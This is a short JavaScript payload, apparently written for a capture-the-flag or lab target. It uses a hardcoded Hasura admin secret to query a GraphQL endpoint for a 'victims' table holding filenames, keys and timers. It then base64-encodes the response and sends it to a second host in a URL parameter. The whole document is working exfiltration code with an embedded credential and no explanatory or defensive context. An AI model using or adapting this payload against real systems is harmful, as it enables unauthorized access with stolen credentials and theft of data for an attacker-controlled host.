var a = new XMLHttpRequest();

var d = '{"query":"{\n victims {\n filename\n id\n key\n name\n timer\n }\n}"}';

a.open("POST", "http://10.10.122.241/v1/graphql/", true);
a.setRequestHeader('x-hasura-admin-secret','s3cr3754uc35432');
a.onreadystatechange=function() {
if (this.readyState===4) {
var b=new XMLHttpRequest();
b.open('GET','http://10.17.17.11/?data='+btoa(this.responseText),false);
b.send();
}
}
a.send(d);
